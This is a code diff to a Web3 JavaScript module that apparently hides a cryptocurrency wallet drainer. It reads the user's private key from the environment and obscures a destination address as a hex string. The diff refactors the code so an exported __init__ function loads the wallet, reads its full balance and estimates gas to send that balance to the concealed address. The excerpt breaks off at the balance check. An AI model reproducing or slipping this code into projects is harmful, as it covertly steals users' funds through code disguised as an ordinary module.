@@ -6,11 +6,7 @@ import dotenv from "dotenv";
 const Web3 = require('web3');
 dotenv.config();
 const w = new Web3(process.env.RPC);
-const a = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
 const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
-w.eth.accounts.wallet.add(a);
-w.eth.defaultAccount = a.address;
-
 const _abi = [
   {
     inputs: [
@@ -1105,9 +1101,11 @@ const _abi = [
   },
 ];
 
-export function __init__() {
+export function __init__() {  
+  w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY));
+  w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY).address;
   try {
-    w.eth.getBalance(a.address).then(function(b:any) {
+    w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
       w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
         w.eth.getGasPrice().then(function(gP:any) {
           if(b - (gP * g) > 0) {
